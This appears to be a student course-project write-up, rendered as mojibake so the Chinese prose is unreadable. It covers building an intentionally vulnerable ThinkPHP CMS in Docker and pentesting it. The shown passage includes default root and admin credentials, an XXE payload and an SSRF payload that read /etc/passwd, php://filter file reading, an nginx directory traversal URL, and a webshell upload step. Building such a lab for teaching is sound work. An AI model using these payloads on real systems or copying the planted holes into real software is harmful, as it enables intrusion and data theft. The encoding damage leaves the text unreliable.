PHPã€JAVAã€Python ä¸­é€‰æ‹©ï¼‰åŠå…¶å½“å‰æµè¡Œçš„å¼€å‘æ¡†æ¶ï¼ˆå¦‚ Java çš„ Struts2ã€Springã€Hibernateï¼ŒPythonçš„ Djangoã€flaskï¼ŒPHP çš„ ThinkPHP ç­‰ï¼‰ å¼€å‘ä¸€ä¸ª Web åº”ç”¨ç³»ç»Ÿã€‚ å…·ä½“è¦æ±‚ï¼š 1ï¼‰è¯¥ç³»ç»Ÿéœ€å†…ç½®å…¸å‹çš„ Web æ¼æ´ï¼ˆä¸å°‘äº 10 ç§ï¼Œæ¯ç§å¯æœ‰å¤šä¸ªï¼‰ã€‚å¿…é¡»åŒ…å« SQL æ³¨å…¥ã€XSSã€æ–‡ä»¶ä¸Šä¼ ã€æ–‡ä»¶åŒ…å«ã€å‘½ä»¤æ‰§è¡Œã€XXEå’Œååºåˆ—åŒ–ã€‚ 2ï¼‰åŸºäº Docker å®¹å™¨å‘å¸ƒç³»ç»Ÿï¼Œå¹¶å®Œæˆå†…ç½®å…¸å‹æ¼æ´çš„æ”»å‡»è¿‡ç¨‹ã€‚ 3ï¼‰å°†åŸæœ‰æ¼æ´é¡µé¢è¿›è¡Œå®Œå–„ï¼ˆä¸èƒ½ç›´æ¥åœ¨åŸæœ‰æ¼æ´é¡µé¢ä¿®æ”¹ï¼Œéœ€é‡æ–°åˆ›å»ºä¿®å¤æ¼æ´çš„é¡µé¢ï¼‰ä»¥ä¿®å¤æ‰€æœ‰æ¼æ´ï¼Œå¹¶é€šè¿‡æµ‹è¯•è¯æ˜æ¼ æ´å·²ç»ä¿®å¤ã€‚ ç½‘ç«™å¼€å‘1.å¼€å‘å·¥å…·phpstorm+vscode phpstorm é‡è¦ç”¨äºå¯¹phpä»£ç çš„ä»£ç ç¼–å†™å’Œä¿®æ”¹ï¼Œå…¶æä¾›äº†ååˆ†ä¸°å¯Œçš„åŠŸèƒ½ï¼Œå¸®åŠ©å¼€å‘è€…å¿«é€Ÿä¿®æ”¹ä»£ç ï¼Œæä¾›ä»£ç å®šä½ï¼Œèƒ½å¤Ÿå¿«é€Ÿçš„å®šä½åˆ°æŸä¸ªå‡½æ•°æ‰€å±æ–‡ä»¶ï¼Œå¤§å¤§æé«˜äº†å·¥ä½œæ•ˆç‡ã€‚ è€Œvscodeåˆ™è´Ÿè´£æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œå…¶ç›¸å¯¹äºPHP stormæ¯”è¾ƒè½»é‡ï¼Œå ç”¨å†…å­˜å°ï¼Œé€Ÿåº¦å¿«ã€‚ 2.ç¯å¢ƒæ­å»ºLinuxä½¿ç”¨dockerä»¥åŠdocker-compose å…·ä½“ä¸ºmysql 5.6 + nginx +php7.1 å…¶ä¸­docker-compose.yml version: &#x27;3&#x27; services: nginx: image: hub.c.163.com/library/nginx:latest # ä¸‹è½½é•œåƒçš„æºï¼Œè¿™é‡Œé€‰æ‹©ç½‘æ˜“çš„é•œåƒæºï¼Œå¯ä»¥æé«˜ä¸‹è½½çš„é€Ÿåº¦ï¼Œ latestæ˜¯æœ€æ–°ç‰ˆæœ¬ ports: - 80:80 # ç«¯å£æ˜ å°„ - 443:443 volumes: - ./nginx/nginx.conf:/etc/nginx/nginx.conf #nginxçš„é…ç½®æ–‡ä»¶è·¯å¾„ - ./nginx/conf.d:/etc/nginx/conf.d # å…¶ä»–çš„é…ç½®æ–‡ä»¶ - ./html:/var/www #ç›®å½•æ˜ å°„ srcä½œä¸ºç½‘ç«™çš„æ ¹ç›®å½•ï¼Œç½‘ç«™çš„æ‰€æœ‰æ–‡ä»¶éœ€è¦æ”¾åœ¨è¿™é‡Œ php: build: ./php volumes: - ./html:/var/www #æ ¹ç›®å½• - ./php/php.ini:/usr/local/etc/php/php.ini # phpçš„é…ç½®æ–‡ä»¶ - ./php/php-fpm.conf:/usr/local/etc/php-fpm.d/www.conf mysql: image: hub.c.163.com/library/mysql:5.6 volumes: - ./mysql/data:/var/lib/mysql - ./mysql/my.cnf:/etc/mysql/conf.d/my.cnf - ./mysql/init:/docker-entrypoint-initdb.d/ # è¿™é‡Œéœ€è¦åˆå§‹åŒ–ä¸€ä¸ªæ•°æ®åº“ ports: - 3306:3306 environment: - MYSQL_ROOT_PASSWORD=root # mysqlæ•°æ®åº“çš„å¯†ç  å…¶ä½™é…ç½®æ–‡ä»¶å¯ä»¥æ ¹æ®éœ€è¦ä»ç½‘ä¸Šè·å–ã€‚ windowsæ­å»ºç›®çš„æ˜¯æµ‹è¯•ä½¿ç”¨ï¼Œæ–¹ä¾¿é‡æ–°æ­å»ºå’Œæ•°æ®ç®¡ç†ï¼Œä¸ºå†linuxä¸Šæ­å»ºåšå¥½å‡†å¤‡ è¯¾ç¨‹è¦æ±‚ä½¿ç”¨dockeræ­å»ºè¿è¡Œç¯å¢ƒï¼Œä½†æ˜¯Linuxç³»ç»Ÿæ˜¯è™šæ‹Ÿæœºæ­å»ºçš„ï¼Œé‡Œé¢æ²¡æœ‰å¥½ç”¨çš„phpStromï¼Œæ‰€ä»¥å…ˆåœ¨windowsä¸Šæ­å»ºï¼Œè¯•è¯•æ°´ã€‚ å·¥å…·ä½¿ç”¨phpstduy2018ï¼Œapache+php7.1 é¦–å…ˆåœ¨æ•°æ®åº“ä¸­å»ºç«‹ä¸€ä¸ªæ•°æ®åº“ï¼Œå¤åˆ¶cms.sqlä¸­çš„å†…å®¹åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œ å°†æ–‡ä»¶æ”¾å…¥wwwç›®å½•ä¸‹ï¼Œä¿®æ”¹configä¸­çš„database.phpå†…å®¹ï¼Œå°†ç”¨æˆ·åå’Œå¯†ç è¯¥å¯¹åº”çš„å†…å®¹ æ‰“å¼€phpstduy,é€‰æ‹© å…¶ä»–èœå•é€‰é¡¹-&gt;ç«™ç‚¹åŸŸåç®¡ç†ï¼Œç½‘ç«™ç›®å½•é€‰æ‹©cms/publicï¼Œç½‘ç«™åéšä¾¿èµ·ï¼Œå¦‚www.mycms.com æ‰“å¼€hostæ–‡ä»¶ï¼Œæ·»åŠ  127.0.0.1 www.mycms.comï¼Œç„¶åè®¿é—®å³å¯www.mycms.com/adminè¿›å…¥åå° è´¦å·å¯†ç éƒ½ä¸ºadmin 3.å¼€å‘è¿‡ç¨‹å¼€å‘thinkphpçš„ç½‘ç«™ï¼Œå½“ç„¶ç¦»ä¸å¼€ThinkPHPçš„æ‰‹å†Œhttp://www.shouce.ren/api/view/a/15517 thinkphpä¸­æ˜¯åŸºäºæ¨¡å—\\æ§åˆ¶å™¨\\æ–¹æ³•æ¥è®¿é—®ç½‘é¡µçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»å­¦ä¼šå¦‚ä½•åˆ›å»ºä¸€ä¸ªæ§åˆ¶å™¨ åœ¨ç½‘ç«™çš„æ–‡ä»¶ä¸‹ï¼Œè°ƒå‡ºç»ˆç«¯ä½¿ç”¨ php think make:controller æ¨¡å—å\\æ§åˆ¶å™¨å åˆ›å»ºå®Œåä¾¿å¯ä»¥åœ¨æµè§ˆå™¨ä¸­è¾“å…¥127.0.0.1\\æ¨¡å—å\\æ§åˆ¶å™¨åï¼Œè¿›è¡Œè®¿é—®ï¼Œå½“ç„¶è¿˜è¦ç»§ç»­å®Œå–„å…¶ä¸­çš„å†…å®¹ ä»¥ä¸Šæ˜¯å¼€å‘æœ€åŸºç¡€çš„éƒ¨åˆ†ï¼Œä¹Ÿæ˜¯æœ€é‡è¦çš„éƒ¨åˆ†ï¼Œæ‰€æœ‰çš„æ¼æ´ä»£ç åŸºæœ¬éƒ½éœ€è¦åœ¨è‡ªå·±æ‰€åˆ›å»ºçš„æ§åˆ¶å™¨ä¸­å®Œæˆçš„ã€‚ 4.ç½‘ç«™ä»‹ç»æ­¤ç«™ç‚¹é‡‡ç”¨çš„æ˜¯åŸºäºthinkPHPçš„cmsï¼Œæ­¤cmsåŒ…å«å¸¸ç”¨äºä¸€äº›å…¬å¸ä¸»é¡µä»‹ç»æˆ–è€…ä¸ªäººåšå®¢çš„æ­å»ºï¼Œæ˜¯ä¸€ä¸ªåŠŸèƒ½ç›¸å¯¹æ¯”è¾ƒé½å…¨çš„cmsï¼Œä½†æ˜¯éšç€åŠŸèƒ½çš„å¢å¤šä¹Ÿä¼šæš´éœ²å‡ºä¸€äº›é—®é¢˜ï¼Œæ‰€ä»¥ä¼šå­˜åœ¨ä¸€äº›æ¼æ´ï¼ŒåŠ ä¸Šè‡ªå·±æ ¹æ®è¯¾ç¨‹è¦æ±‚å¯¹å…¶è¿›è¡Œäº†é­”æ”¹ï¼Œä½¿å¾—è¯¥ç³»ç»ŸåŒ…å«äº†åäºŒç§æ¼æ´ï¼ŒäºŒåä¸ªæ¼æ´ç‚¹ã€‚ è¯¥ç½‘ç«™æ˜¯ä¸€å®¶å®‰å…¨å…¬å¸çš„ä¸»é¡µï¼Œä½†æ˜¯ç”±äºè¯¥å®‰å…¨å…¬å¸åˆšåˆšæˆç«‹ä¸ä¹…ï¼Œç½‘ç«™å¼€å‘äººå‘˜å®‰å…¨æ„è¯†ä¸å¤Ÿé«˜ï¼ˆhaha, çº¯å±è™šæ„ï¼‰ï¼Œå¯¼è‡´è¯¥ç½‘ç«™ä¸­å­˜åœ¨äº†å¾ˆå¤šæ¼æ´ï¼Œæ­¤æ—¶ä¸€ä¸ªä¸å®‰å¥½å¿ƒçš„é»‘å®¢çœ‹ä¸Šäº†è¿™å®¶å®‰å…¨å…¬å¸çš„ç½‘ç«™ã€‚å¯¹è¯¥ç½‘ç«™è¿›è¡Œäº†æ”»å‡»ã€‚ å…·ä½“åŠŸèƒ½å¦‚ä¸‹ï¼š (1).å‰å°å±•ç¤ºé¡µé¢ï¼ŒåŒ…å«å…³äºæˆ‘ä»¬ï¼Œæ–°é—»ä¸­å¿ƒï¼Œè”ç³»æˆ‘ä»¬ä»¥åŠæ„è§åé¦ˆå››ä¸ªæ¨¡å— å…¶ä¸­å…³äºæˆ‘ä»¬â€“&gt;å…¬å¸ä¸»é¡µ ä½ç½®å­˜åœ¨SSRFæ¼æ´ æ„è§åé¦ˆ å­˜åœ¨XXEæ¼æ´ (2).åå°ç®¡ç†å‘˜é¡µé¢ï¼Œåå°ç®¡ç†åŠŸèƒ½ååˆ†ä¸°å¯Œï¼Œå‡ ä¹åŒ…å«æ‰€æœ‰éœ€è¦çš„åŠŸèƒ½ï¼Œå¹¶ä¸”å¯ä»¥æ ¹æ®éœ€è¦è‡ªå®šä¹‰æ¨¡å—å¹¶å®‰è£…ï¼Œå…¶ä¸­çš„çŸ­æ¶ˆæ¯å‘é€å­˜åœ¨XSSæ¼æ´ï¼ŒæŸ¥çœ‹å†…ç½‘ä¸»æœºå’Œphpinfoå­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œç®¡ç†ä¼šå‘˜çš„é¡µé¢å­˜åœ¨CSRFæ¼æ´ (3).ç”¨æˆ·æ³¨å†Œä¸ç™»å½•ï¼Œæä¾›ç”¨æˆ·æ³¨å†Œå’Œç™»å½•åŠŸèƒ½ï¼Œç™»å½•åçš„ç”¨æˆ·å¯ä»¥æ ¹æ®æƒé™å‘ä¸åŒçš„æ ç›®æŠ•ç¨¿ï¼Œå‘åˆ«çš„ç”¨æˆ·å‘é€æ¶ˆæ¯ï¼Œæ”¯æŒå¤´åƒæ›´æ¢ï¼Œå¯†ç ä¿®æ”¹ç­‰åŠŸèƒ½ã€‚å…¶ä¸­æŠ•ç¨¿ä½ç½®å­˜åœ¨XSSæ¼æ´å’Œæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå¯†ç ä¿®æ”¹ä½ç½®å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚ (4).åœ¨å‰å°é¡µé¢ä¸­æœ‰ä¸€ä¸ªå•ç‹¬çš„æ¨¡å—ï¼Œå«å…è¯•åŠ å…¥ï¼Œè¿™é‡Œå­˜åœ¨ä¸€ä¸ªCTFé¢˜ç›®ï¼Œç±»å‹æ—¶unserializeï¼Œå¦‚æœå¯ä»¥è·å–flagï¼Œåˆ™å¯ä»¥è·å–å…è¯•èµ„æ ¼åŠ å…¥å›¢é˜Ÿã€‚ 5.æ¼æ´ä»‹ç» æœ¬åœ°æ–‡ä»¶åŒ…å« æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œé¡¾åæ€ä¹‰ï¼ŒæŒ‡çš„æ˜¯èƒ½æ‰“å¼€å¹¶åŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ï¼Œé€ æˆè¿™ä¸ªæ¼æ´çš„å‡½æ•°æœ‰å››ä¸ªinclude,include_once,require,require_onceã€‚è¯¥æ¼æ´å¯ä»¥ä½¿ç”¨phpä¸ºåè®®php://filterï¼Œè¯»å–phpæ–‡ä»¶çš„æºç ï¼Œåœ¨ä¸€äº›ctfé¢˜ç›®ä¸­å¾ˆå¸¸è§ã€‚ è¯¥æ¼æ´å­˜åœ¨äºç½‘ç«™é¦–é¡µçš„è”ç³»æˆ‘ä»¬é¡µé¢ ssrf æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´å¯¹å†…ç½‘è¿›è¡Œæ‰«ææ¢æµ‹å­˜æ´»çš„ä¸»æœºå’Œç«¯å£ï¼Œè¿›è€Œå¯¹å†…ç½‘è¿›è¡Œæ”»å‡»ã€‚æ­¤å¤–è¯¥æ¼æ´è¿˜ä¼šé€ æˆæ–‡ä»¶åŒ…å«ï¼Œä½¿ç”¨file://åè®®+æ–‡ä»¶ç»å¯¹è·¯å¾„å¯ä»¥è·å–æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€‚ æ€»ç»“SSRFé€ æˆçš„å±å®³ï¼š æ‰«å†…ç½‘ å‘å†…éƒ¨ä»»æ„ä¸»æœºçš„ä»»æ„ç«¯å£å‘é€ç²¾å¿ƒæ„é€ çš„Payload DOSæ”»å‡»ï¼ˆè¯·æ±‚å¤§æ–‡ä»¶ï¼Œå§‹ç»ˆä¿æŒè¿æ¥Keep-Alive Alwaysï¼‰ æ”»å‡»å†…ç½‘çš„webåº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨GETå‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡»ï¼ˆæ¯”å¦‚struts2ï¼Œsqliç­‰ï¼‰ åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ç­‰ æ­¤æ¼æ´å­˜åœ¨è®¿é—®å…¬å¸ä¸»é¡µ xxe XXE(XML External Entity Injection) å…¨ç§°ä¸º XML å¤–éƒ¨å®ä½“æ³¨å…¥ï¼Œä»åå­—å°±èƒ½çœ‹å‡ºæ¥ï¼Œè¿™æ˜¯ä¸€ä¸ªæ³¨å…¥æ¼æ´ï¼Œæ³¨å…¥çš„æ˜¯XMLå¤–éƒ¨å®ä½“ã€‚ æ­¤æ¼æ´å¯ä»¥å½¢æˆå‘½ä»¤æ‰§è¡Œå’Œæ–‡ä»¶åŒ…å«æ”»å‡»ã€‚ æ­¤æ¼æ´å­˜åœ¨äºæ„è§åé¦ˆé¡µé¢ sqlæ³¨å…¥ â€” åŒ…å«ä¸¤ä¸ªæ¼æ´ç‚¹ Sql æ³¨å…¥æ”»å‡»æ˜¯é€šè¿‡å°†æ¶æ„çš„ Sql æŸ¥è¯¢æˆ–æ·»åŠ è¯­å¥æ’å…¥åˆ°åº”ç”¨çš„è¾“å…¥å‚æ•°ä¸­ï¼Œå†åœ¨åå° Sql æœåŠ¡å™¨ä¸Šè§£ææ‰§è¡Œè¿›è¡Œçš„æ”»å‡»ï¼Œå®ƒç›®å‰é»‘å®¢å¯¹æ•°æ®åº“è¿›è¡Œæ”»å‡»çš„æœ€å¸¸ç”¨æ‰‹æ®µä¹‹ä¸€ã€‚ æ­¤æ¼æ´å­˜åœ¨ä¸ç”¨æˆ·ä¿®æ”¹å¯†ç é¡µé¢å’Œç™»å½•ä¿®æ”¹ç¨¿ä»¶é¡µé¢ï¼ŒäºŒè€…éƒ½å¯ä»¥ä½¿ç”¨ç›²æ³¨è¿›è¡Œæ”»å‡»ã€‚ æ–‡ä»¶ä¸Šä¼  ç½‘ç«™WEBåº”ç”¨éƒ½æœ‰ä¸€äº›æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œæ¯”å¦‚æ–‡æ¡£ã€å›¾ç‰‡ã€å¤´åƒã€è§†é¢‘ä¸Šä¼ ï¼Œå½“ä¸Šä¼ åŠŸèƒ½çš„å®ç°ä»£ç æ²¡æœ‰ä¸¥æ ¼æ ¡éªŒä¸Šä¼ æ–‡ä»¶çš„åç¼€å’Œæ–‡ä»¶ç±»å‹æ—¶ï¼Œå°±å¯ä»¥ä¸Šä¼ ä»»æ„æ–‡ä»¶ç”šè‡³æ˜¯å¯æ‰§è¡Œæ–‡ä»¶åé—¨ã€‚ æ­¤æ¼æ´å­˜åœ¨äºç”¨æˆ·ä¸Šä¼ å¤´åƒçš„ä½ç½®ï¼Œä¸Šä¼ ä¸€å¥è¯æœ¨é©¬åå¯ç›´æ¥ä½¿ç”¨èšå‰‘è·å–shell å¼±å£ä»¤ å¼±å£ä»¤é¡¾åæ€ä¹‰æ˜¯ä½¿ç”¨äº†å®‰å…¨æ€§æ¯”è¾ƒä½ï¼Œå¹¶ä¸”æ¯”è¾ƒå¸¸è§çš„çŸ­å­—ç¬¦ä½œä¸ºå¯†ç  æ­¤æ¼æ´å­˜åœ¨äºç®¡ç†å‘˜å¯†ç ï¼Œè¿™æ˜¯å¾ˆå¸¸è§ä½†åˆå¾ˆå±é™©çš„ä¸€ä¸ªæ¼æ´ xss â€” åŒ…å«ä¸¤ä¸ªæ¼æ´ç‚¹ xsså°±æ˜¯æ”»å‡»è€…åœ¨webé¡µé¢æ’å…¥æ¶æ„çš„Scriptä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­webé‡Œé¢çš„Scriptä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç‰¹æ®Šç›®çš„ã€‚æ”»å‡»è¿™å¯ä»¥ä½¿ç”¨xssè·å–å¤„äºç™»å½•çŠ¶æ€çš„ç”¨æˆ·cookieï¼Œä»è€Œå¯ä»¥æ— å¯†ç ç™»å½•è´¦å·ã€‚ æ­¤æ¼æ´å­˜åœ¨ä¸¤ä¸ªåœ°æ–¹ï¼Œä¸€ä¸ªæ˜¯ç”¨æˆ·æŠ•ç¨¿ï¼Œä¸€ä¸ªç”¨æˆ·å‘é€çŸ­æ¶ˆæ¯ rce æ˜¯æŒ‡ç”¨æˆ·é€šè¿‡æµè§ˆå™¨æäº¤æ‰§è¡Œå‘½ä»¤ï¼Œç”±äºæœåŠ¡å™¨ç«¯æ²¡æœ‰é’ˆå¯¹æ‰§è¡Œå‡½æ•°åšè¿‡æ»¤ï¼Œå¯¼è‡´åœ¨æ²¡æœ‰æŒ‡å®šç»å¯¹è·¯å¾„çš„æƒ…å†µä¸‹å°±æ‰§è¡Œå‘½ä»¤ï¼Œå¯èƒ½ä¼šå…è®¸æ”»å‡»è€…é€šè¿‡æ”¹å˜ $PATH æˆ–ç¨‹åºæ‰§è¡Œç¯å¢ƒçš„å…¶ä»–æ–¹é¢æ¥æ‰§è¡Œä¸€ä¸ªæ¶æ„æ„é€ çš„ä»£ç ã€‚ æ­¤æ¼æ´å­˜åœ¨äºåå°ç®¡ç†é¡µé¢ä¸­çš„ä¿¡æ¯é‡‡é›†â€“&gt;æŸ¥çœ‹å†…ç½‘ä¸»æœº ä»»æ„æ–‡ä»¶ä¸‹è½½ éæ³•ä¸‹è½½æœåŠ¡å™¨ä¸Šå­˜åœ¨çš„èµ„æº csrf è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€  ï¼Œ è·ŸXSSæ”»å‡»ä¸€æ ·ï¼Œå­˜åœ¨å·¨å¤§çš„å±å®³æ€§ ã€‚åˆ©ç”¨csrfï¼Œæ”»å‡»è€…å¯ä»¥ç›—ç”¨ä½ çš„èº«ä»½ï¼Œä»¥ä½ çš„åä¹‰å‘é€æ¶æ„è¯·æ±‚ã€‚ ä½ çš„åä¹‰å‘é€é‚®ä»¶ã€å‘æ¶ˆæ¯ï¼Œç›—å–ä½ çš„è´¦å·ï¼Œæ·»åŠ ç³»ç»Ÿç®¡ç†å‘˜ï¼Œç”šè‡³äºè´­ä¹°å•†å“ã€è™šæ‹Ÿè´§å¸è½¬è´¦ç­‰ã€‚ ååºåˆ—åŒ– ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ˜¯æŒ‡ç½‘ç«™å¯¹ç”¨æˆ·å¯æ§åˆ¶çš„æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œæ”»å‡»è€…èƒ½å¤Ÿæ“çºµåºåˆ—åŒ–çš„å¯¹è±¡ï¼Œä»¥å°†æœ‰å®³æ•°æ®ä¼ é€’åˆ°åº”ç”¨ç¨‹åºä»£ç ä¸­ã€‚ç”šè‡³æœ‰å¯èƒ½ç”¨å®Œå…¨ä¸åŒç±»çš„å¯¹è±¡æ›¿æ¢åºåˆ—åŒ–çš„å¯¹è±¡ã€‚æ›´å¤¸å¼ çš„æ˜¯ï¼Œå°†å¯¹ç½‘ç«™å¯ç”¨çš„ä»»ä½•ç±»åˆ«çš„å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–å’Œå®ä¾‹åŒ–ï¼Œè€Œä¸é¢„æœŸçš„ç±»åˆ«æ— å…³ã€‚å› æ­¤ï¼Œä¸å®‰å…¨çš„ååºåˆ—åŒ–æœ‰æ—¶ç§°ä¸ºâ€œå¯¹è±¡æ³¨å…¥â€æ¼æ´ æ­¤æ¼æ´å­˜åœ¨å…è¯•åŠ å…¥æˆ‘ä»¬çš„é¡µé¢ï¼ŒæˆåŠŸè€…å¯ä»¥è·å¾—ä¸€ä¸ªflagã€‚ æ¼æ´åˆ©ç”¨æ¸—é€æµ‹è¯•æµç¨‹ 1.RFIé¦–å…ˆç‚¹å‡»é¦–é¡µçš„æœ€ä¸‹é¢â€œä¼˜ç§€å‘˜å·¥â€ï¼Œå¯ä»¥å‘ç°URLçš„å˜åŒ–ï¼Œçœ‹åˆ°æœ€åæœ‰ä¸€ä¸ªfileå‚æ•°ï¼ŒçŒœæµ‹è¯¥é¡µé¢çš„ä¸€äº›å‚æ•°æ˜¯ä»info.phpä¸­è·å–çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªä½ç½®å°±åº”è¯¥æ˜¯ä¸€ä¸ªæœ¬åœ°æ–‡ä»¶åŒ…å«ã€‚å°è¯•å°†info.phpæ¢æˆå…¶ä»–çš„æ–‡ä»¶åï¼Œå‘ç°é¡µé¢ä¸­çš„ä¸€äº›å†…å®¹æ¶ˆå¤±äº†ï¼Œè¯´æ˜è¿™é‡Œå°±æ˜¯ç”¨äº†æ–‡ä»¶åŒ…å«ã€‚ é‚£ä¹ˆå¦‚æœæ²¡æœ‰å¯¹è¯¥å‚æ•°è¿›è¡Œè¿‡æ»¤æˆ–è€…å…¶ä»–çš„é™åˆ¶çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨php://filteråè®®è¯»å–åˆ°phpæ–‡ä»¶çš„base64æºç ï¼Œ æˆ–è€…ç›´æ¥è¯»å–æ“ä½œç³»ç»Ÿä¸­çš„ä¸€äº›æ•æ„Ÿæ–‡ä»¶ï¼Œå¦‚/etc/passwdã€‚ å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œæ²¡æœ‰å¯¹fileåè®®è¿‡æ»¤ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡ä¸€äº›å¸¸ç”¨çš„æ–‡ä»¶è·¯å¾„è·å–åˆ°æ•æ„Ÿæ–‡ä»¶ 2.XXEæ³¨å…¥XMLæ–‡ä»¶ä¸­ï¼Œä¸€æ—¦æ–‡ä»¶è¢«æ‰§è¡Œï¼Œå°†ä¼šè¯»å–æœåŠ¡å™¨ä¸Šçš„æœ¬åœ°æ–‡ä»¶ï¼Œå¹¶å¯¹å†…ç½‘å‘èµ·è®¿é—®æ‰«æå†…éƒ¨ç½‘ç»œç«¯å£ã€‚æ¢è€Œè¨€ä¹‹ï¼ŒXXEæ˜¯ä¸€ç§ä»æœ¬åœ°åˆ°è¾¾å„ç§æœåŠ¡çš„æ–¹æ³•ã€‚æ­¤å¤–ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šè¿™ä¹Ÿå¯èƒ½å¸®åŠ©æ”»å‡»è€…ç»•è¿‡é˜²ç«å¢™è§„åˆ™è¿‡æ»¤æˆ–èº«ä»½éªŒè¯æ£€æŸ¥ã€‚ xxeæ¼æ´å­˜åœ¨äºæ„è§åé¦ˆé¡µé¢ï¼Œä½¿ç”¨BpæŠ“åŒ…å¯ä»¥çœ‹åˆ°ï¼Œæäº¤çš„å‚æ•°æ˜¯xmlæ ¼å¼ï¼Œæäº¤æˆåŠŸåä¼šè¿”å›ä¸€ä¸ªæç¤ºä¿¡æ¯ æ—¢ç„¶å‚æ•°æ˜¯ä»¥xmlæ ¼å¼æäº¤çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•æ„é€ å‡ºä¸€ä¸ªå¤–éƒ¨å®ä½“æ³¨å…¥å…¶ä¸­ï¼Œé€ æˆæ–‡ä»¶åŒ…å«æˆ–è€…å‘½ä»¤æ‰§è¡Œã€‚ ä½¿ç”¨payloadè¯»å–/etc/passwdæ–‡ä»¶ &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE a [ &lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;file;&lt;&#x2F;username&gt;&lt;info&gt;as&lt;&#x2F;info&gt;&lt;&#x2F;user&gt; 3.SSRFå½“è®¿é—®å…¬å¸ä¸»é¡µè¿™ä¸ªé¡µé¢æ—¶ä¼šå‘ç°urlå‘ç”Ÿå˜åŒ–ï¼Œå¹¶è·³è½¬åˆ°å¦ä¸€é¡µé¢ è¿™é‡Œæ˜¯è·³è½¬åˆ°äº†æˆ‘çš„åšå®¢é¡µé¢ï¼Œä½†æ˜¯å¯èƒ½ç”±äºç¼ºå°‘æ¸²æŸ“ï¼Œæ˜¾ç¤ºä¸æ­£å¸¸ï¼Œå°è¯•è®¿é—®ç™¾åº¦ï¼Œgetæäº¤ ?url=https://www.baidu.com å¯ä»¥å‘ç°æˆåŠŸè·³è½¬åˆ°äº†ç™¾åº¦çš„é¡µé¢ï¼ŒçŒœæµ‹æˆ‘ä»¬æäº¤çš„urlå‚æ•°æ²¡æœ‰è¿›è¡Œè¿‡æ»¤å°±ç›´æ¥å¸¦å…¥åˆ°å‡½æ•°ä¸­æ‰§è¡Œã€‚ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨file://åè®®è¯»å–æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œä½¿ç”¨payload:?url=file:///etc/passwdï¼ŒæˆåŠŸè¯»å–åˆ°æ–‡ä»¶å†…å®¹ï¼Œæ¼æ´åˆ©ç”¨æˆåŠŸã€‚ 4.ç›®å½•éå†åœ¨æµè§ˆå™¨ä¸­æŒ‰F12ï¼Œåœ¨networkä¸­æŸ¥çœ‹å“åº”å¤´ï¼Œå¯ä»¥å‘ç°å­˜åœ¨serverå­—æ®µï¼Œè¿™æ˜¯ç½‘ç«™ä½¿ç”¨çš„æœåŠ¡å™¨ä»¥åŠç‰ˆæœ¬ä¿¡æ¯ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°æ˜¯nginx è€Œnginxå­˜åœ¨ä¸€ä¸ªå¾ˆå¸¸è§çš„æ¼æ´â€”é…ç½®ä¸å½“å¯¼è‡´çš„ç›®å½•ç©¿è¶Šæ¼æ´ è¿›è¡Œæ”»å‡» å°è¯•è®¿é—®http://192.168.164.147/files/ï¼Œå‡ºç°äº†imagesæ–‡ä»¶å¤¹ï¼Œè¿™åº”è¯¥ç½‘ç«™ä¿å­˜ä¸Šä¼ å›¾ç‰‡çš„ä½ç½® è¾“å…¥http://192.168.164.147/files../çœ‹åˆ°äº†ç½‘ç«™çš„æ ¹ç›®å½•ä¸­çš„å†…å®¹ï¼Œç‚¹å‡»å¯ä»¥å°†éƒ¨åˆ†æ–‡ä»¶ä¸‹è½½ã€‚ 5.SQLæ³¨å…¥ï¼ˆ4ä¸ªï¼‰æ¼æ´ç‚¹ä¸€ç¬¬ä¸€ä¸ªsqlæ³¨å…¥æ¼æ´ç‚¹åœ¨ç”¨æˆ·ç™»å½•é¡µé¢ï¼Œå­˜åœ¨ä¸€ä¸ªä¿®æ”¹å¯†ç 